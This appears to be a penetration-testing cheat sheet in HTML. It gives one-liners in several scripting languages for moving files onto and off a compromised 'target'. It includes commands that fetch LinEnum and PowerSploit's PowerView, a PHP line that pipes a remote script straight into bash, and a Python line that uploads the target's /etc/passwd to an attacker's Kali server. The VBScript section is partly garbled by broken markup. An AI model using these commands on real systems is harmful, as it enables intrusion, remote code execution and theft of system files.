<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>File Transfer using Common Coding Languages</title>
</head><body>some oneliners and short codes to perform filetransfers in coding languages commonly found on targets:<br/>
Get a file onto the target(Download):<br/>
Python 2.7<ul><li style="list-style-type: none">python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh") &nbsp;</li>
</ul>
Python 3:<ul><li style="list-style-type: none">python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/&#09;LinEnum/master/LinEnum.sh", "LinEnum.sh")' &nbsp;</li>
</ul>
PHP<ul><li style="list-style-type: none">php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);' &nbsp;</li>
</ul>
PHP alternative with fopen() and a buffer<ul><li style="list-style-type: none">php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);' &nbsp;</li>
</ul>
PHP and sent it directly to bash in a pipe and not save on machine:<ul><li style="list-style-type: none">php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash &nbsp;</li>
</ul>
Ruby:<ul><li style="list-style-type: none">ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))' &nbsp;</li>
</ul>
Perl:<ul><li style="list-style-type: none">perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");' &nbsp;</li>
</ul>
javascript:<ul><li style="list-style-type: none">create a file f.e: "wget.js" with the following code:</li>
<li style="list-style-type: none">var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");</li>
<li style="list-style-type: none">WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); </li>
<li style="list-style-type: none">WinHttpReq.Send(); </li>
<li style="list-style-type: none">BinStream = new ActiveXObject("ADODB.Stream"); </li>
<li style="list-style-type: none">BinStream.Type = 1; </li>
<li style="list-style-type: none">BinStream.Open(); </li>
<li style="list-style-type: none">BinStream.Write(WinHttpReq.ResponseBody); </li>
<li style="list-style-type: none">BinStream.SaveToFile(WScript.Arguments(1)); &nbsp;</li>
</ul>
Use powershell terminal oder Windows command prompt to execute:<ul><li style="list-style-type: none">cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1 &nbsp;</li>
</ul>
VBScript(scripting language installed on most windows pcs since 98)<ul><li style="list-style-type: none">create a new file "wget.vbs"</li>
<li style="list-style-type: none">dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") </li>
<li style="list-style-type: none">dim bStrm: Set bStrm = createobject("Adodb.Stream") </li>
<li style="list-style-type: none">xHttp.Open "GET", WScript.Arguments.Item(0), False </li>
<li style="list-style-type: none">xHttp.Send</li>
<li style="list-style-type: none">&nbsp;</li>
<li style="list-style-type: none">with bStrm </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">.type = 1 </li>
</ul>
</li>
</ul>
<ul><ul>.</ul>
</ul>
open <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">.write xHttp.responseBody </li>
<li style="list-style-type: none">.savetofile WScript.Arguments.Item(1), 2 </li>
</ul>
</li>
<li style="list-style-type: none">end with &nbsp;</li>
</ul>
Execute file on powershell terminal:<ul><li style="list-style-type: none">cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1 &nbsp;</li>
</ul>
<br/>
Uploading a file using a Pytthon oneliner - from target to os:<ul><li style="list-style-type: none">start uploadserver on our kali:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">python3 -m uploadserver &nbsp; </li>
</ul>
</li>
<li style="list-style-type: none">send the file to our kali:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})' &nbsp;</li>
</ul>
</li>
</ul>
</body></html>